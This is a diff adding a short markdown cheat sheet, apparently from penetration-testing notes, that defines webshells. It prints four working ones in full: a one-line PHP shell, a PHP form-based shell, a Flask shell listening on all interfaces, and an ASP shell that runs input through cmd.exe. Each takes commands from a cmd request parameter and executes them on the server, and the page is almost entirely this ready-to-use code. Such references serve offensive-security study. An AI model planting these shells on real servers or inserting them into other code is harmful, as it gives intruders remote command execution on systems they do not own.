@@ -1,0 +1,77 @@
+A **webshell** is a malicious script uploaded to a web server to enable remote command execution. 
+
+
+## Basic PHP Command Prompt
+
+A simple PHP script can be used to execute system commands via a GET request:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+This allows to execute commands by passing them in the URL, such as:
+
+```
+http://example.com/shell.php?cmd=whoami
+```
+
+## PHP Webshell
+
+A more interactive **webshell** can be created using an HTML form to execute commands:
+
+```html
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
+This script provides a simple web interface to execute system commands by entering them into the form field.
+
+## Python Webshell
+
+```python
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def shell():
+    cmd = request.args.get('cmd')
+    if cmd:
+        return os.popen(cmd).read()
+    return 'Send a command using ?cmd=your_command'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+```
+
+This Python webshell uses Flask to run system commands via HTTP requests.
+
+## ASP Webshell
+
+```
+<%
+Set shell = Server.CreateObject("WScript.Shell")
+cmd = Request.QueryString("cmd")
+If cmd <> "" Then
+    Set exec = shell.Exec("cmd.exe /c " & cmd)
+    Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
+End If
+%>
+```
+
+This ASP webshell executes system commands using `cmd.exe` and displays the output.
